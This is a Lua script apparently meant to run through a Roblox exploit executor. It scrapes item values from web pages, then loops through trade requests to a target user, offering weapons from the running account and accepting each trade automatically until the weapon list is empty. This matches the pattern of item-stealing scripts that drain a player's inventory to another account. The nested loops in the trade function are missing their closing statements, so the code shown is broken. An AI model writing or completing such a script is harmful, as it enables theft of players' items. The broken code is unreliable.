local function getRequest() return request or (syn and syn.request) or http_request or nil end
local function trim(s) return s:match("^%s*(.-)%s*$") end
local function fetchHTML(url)
    local f = getRequest() if not f then return "" end
    local res = f({Url = url, Method = "GET", Headers = headers, Timeout = 15})
    return res and res.Body or ""
end
local function parseValue(body)
    local s = body:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
    if s then return tonumber((s:gsub(",", ""))) end
    return nil
end
local function extractItems(html)
    local t = {}
    for name, body in html:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        name = name:match("([^<]+)") if not name then continue end
        name = trim(name:gsub("%s+", " ")):lower()
        name = trim((name:split(" Click "))[1])
        local v = parseValue(body)
        if v then t[name] = v end
    end
    return t
end
local function buildValueList()
    local all = {}
    for rarity, url in pairs(categories) do
        task.spawn(function()
            local html = fetchHTML(url)
            if html and html ~= "" then
                local items = extractItems(html)
                for k, v in pairs(items) do all[k] = v end
            end
        end)
    end
    task.wait(2) -- let scraper finish
    return all
end

local function getTradeStatus() return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer() end
local function sendTradeRequest(user)
    local p = Players:FindFirstChild(user) if not p then return end
    pcall(function() ReplicatedStorage.Trade.SendRequest:InvokeServer(p) end)
end
local function addItem(id) ReplicatedStorage.Trade.OfferItem:FireServer(id, "Weapons") end
local function acceptTrade() ReplicatedStorage.Trade.AcceptTrade:FireServer(285646582) end
local function waitEnd() while getTradeStatus() ~= "None" do task.wait(0.1) end end

-- Do trade
local function doTrade(targetUser)
    task.wait(2)
    while #weaponsToSend > 0 do
        local status = getTradeStatus()
        if status == "None" then
            sendTradeRequest(targetUser)
            task.wait(1)
        elseif status == "StartTrade" then
            for i = 1, math.min(4, #weaponsToSend) do
                local it = table.remove(weaponsToSend, 1)
                for _ = 1, it.Amount do
                    addItem(it.DataID)

            acceptTrade()
            waitEnd()
        else
            task.wait(0.5)
        end
    end

end
